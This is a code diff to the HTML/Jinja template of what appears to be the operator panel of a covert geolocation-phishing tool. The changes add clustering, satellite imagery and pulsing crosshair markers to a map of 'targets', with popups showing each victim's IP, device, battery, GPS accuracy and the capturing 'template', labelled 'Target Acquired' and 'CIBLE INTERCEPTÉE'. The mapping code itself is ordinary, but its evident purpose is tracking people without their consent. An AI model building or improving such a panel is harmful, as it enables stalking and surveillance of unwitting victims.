@@ -8,7 +8,24 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <!-- Leaflet Map CSS -->
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.4.1/dist/MarkerCluster.css" />
+    <link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.4.1/dist/MarkerCluster.Default.css" />
     <style>
+        /* Pulse Animation for Map Targets */
+        @keyframes pulse-ring {
+            0% { transform: scale(0.8); box-shadow: 0 0 0 0 rgba(255, 71, 87, 0.7); }
+            70% { transform: scale(1); box-shadow: 0 0 0 15px rgba(255, 71, 87, 0); }
+            100% { transform: scale(0.8); box-shadow: 0 0 0 0 rgba(255, 71, 87, 0); }
+        }
+        .pulse-marker i {
+            animation: pulse-ring 2s infinite;
+            border-radius: 50%;
+            background-color: rgba(20,20,20,0.8);
+            padding: 4px;
+        }
+        .leaflet-popup-content-wrapper { background-color: transparent !important; box-shadow: none !important; padding: 0 !important; }
+        .leaflet-popup-tip { background-color: #1a1e24 !important; border: 1px solid #313d4b; border-bottom: none; border-right: none;}
+        
         body { background-color: #0b0c10; color: #e0e0e0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         .navbar { background-color: #12161b !important; border-bottom: 2px solid #1f2937; }
         .navbar-brand { font-weight: 700; letter-spacing: 1px; color: #00a8ff !important; }
@@ -188,19 +205,50 @@
     
     <!-- Leaflet JS & Map Initialization -->
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <script src="https://unpkg.com/leaflet.markercluster@1.4.1/dist/leaflet.markercluster.js"></script>
     <script>
-        // Init map looking at Europe/Africa roughly
-        var map = L.map('liveMap').setView([20, 0], 2);
-        
-        // CartoDB Dark Matter Base Map (Excellent for Dark Intelligence UI)
-        L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
-            attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors &copy; <a href="https://carto.com/attributions">CARTO</a>',
+        // Maps Layers
+        var baseDark = L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
+            attribution: '&copy; OpenStreetMap contributors &copy; CARTO',
             subdomains: 'abcd',
             maxZoom: 20
-        }).addTo(map);
+        });
+        
+        var baseSat = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
+            attribution: '&copy; Esri',
+            maxZoom: 19
+        });
+        
+        var baseOSM = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+            attribution: '&copy; OpenStreetMap',
+            maxZoom: 19
+        });
+
+        var map = L.map('liveMap', {
+            center: [20, 0],
+            zoom: 2,
+            layers: [baseDark]
+        });
+
+        // Layer Controls
+        var baseMaps = {
+            "Dark Intelligence": baseDark,
+            "Satellite (Tactical)": baseSat,
+            "Standard Street": baseOSM
+        };
+        L.control.layers(baseMaps).addTo(map);
+
+        // Marker Clustering
+        var markers = L.markerClusterGroup({
+            spiderfyOnMaxZoom: true,
+            showCoverageOnHover: false,
+            zoomToBoundsOnClick: true
+        });
+
+        var bounds = [];
 
         var targetIcon = L.divIcon({
-            html: '<i class="fa-solid fa-crosshairs text-danger" style="font-size: 24px;"></i>',
+            html: '<div class="pulse-marker"><i class="fa-solid fa-crosshairs text-danger" style="font-size: 24px; text-shadow: 0 0 10px red;"></i></div>',
             iconSize: [24, 24],
             iconAnchor: [12, 12],
             popupAnchor: [0, -12],
@@ -214,19 +262,36 @@
                     var lat = parseFloat("{{ v.lat | replace(' deg', '') }}");
                     var lon = parseFloat("{{ v.lon | replace(' deg', '') }}");
                     if (!isNaN(lat) && !isNaN(lon)) {
-                        L.marker([lat, lon], {icon: targetIcon}).addTo(map)
-                        .bindPopup(`
-                            <div style="background-color: #12161b; color: #00a8ff; padding: 5px; font-family: monospace; min-width: 150px; font-size: 1.1em;">
-                                <strong style="color: #fff;"><i class="fa-solid fa-skull-crossbones"></i> Target Acquired</strong><br>
-                                IP: <code>{{ v.ip }}</code><br>
-                                Acc: {{ v.acc }}m<br>
-                                By: <span class="badge bg-secondary">{{ v.template }}</span>
+                        var m = L.marker([lat, lon], {icon: targetIcon});
+                        var popupHTML = `
+                            <div style="background-color: #1a1e24; color: #e0e0e0; padding: 12px; font-family: monospace; min-width: 250px; font-size: 1em; border: 1px solid #313d4b; border-radius: 6px; box-shadow: 0 4px 15px rgba(0,0,0,0.5);">
+                                <div style="border-bottom: 1px solid #313d4b; padding-bottom: 8px; margin-bottom: 8px;">
+                                    <strong style="color: #ff4757; font-size: 1.1em;"><i class="fa-solid fa-skull-crossbones"></i> CIBLE INTERCEPTÉE</strong>
+                                </div>
+                                <i class="fa-solid fa-network-wired text-info" style="width: 15px;"></i> IP: <code style="color: #00a8ff;">{{ v.ip }}</code><br>
+                                <i class="fa-solid fa-clock text-muted" style="width: 15px;"></i> Date: <span style="font-size: 0.9em; color:#aaa;">{{ v.date }}</span><br>
+                                <i class="fa-solid fa-desktop text-light" style="width: 15px;"></i> Appareil: <span style="font-size: 0.9em;">{{ v.os }}</span><br>
+                                {% if v.battery and v.battery != 'Not Available' %}<i class="fa-solid fa-battery-half text-warning" style="width: 15px;"></i> Batterie: <span style="font-size: 0.9em;">{{ v.battery }}</span><br>{% endif %}
+                                <i class="fa-solid fa-location-crosshairs text-success" style="width: 15px;"></i> Précision GPS: <strong class="text-success">{{ v.acc }}m</strong><br>
+                                <div style="margin-top: 8px; padding-top: 8px; border-top: 1px dashed #313d4b; text-align: center;">
+                                    <span class="badge bg-danger"><i class="fa-solid fa-bullseye"></i> {{ v.template }}</span>
+                                </div>
                             </div>
-                        `);
+                        `;
+                        m.bindPopup(popupHTML);
+                        markers.addLayer(m);
+                        bounds.push([lat, lon]);
                     }
                 } catch(e) {}
             {% endif %}
         {% endfor %}
+        
+        map.addLayer(markers);
+        
+        // Auto-fit bounds if we have targets
+        if(bounds.length > 0) {
+            map.fitBounds(bounds, {padding: [50, 50], maxZoom: 16});
+        }
     </script>
 </body>
 </html>
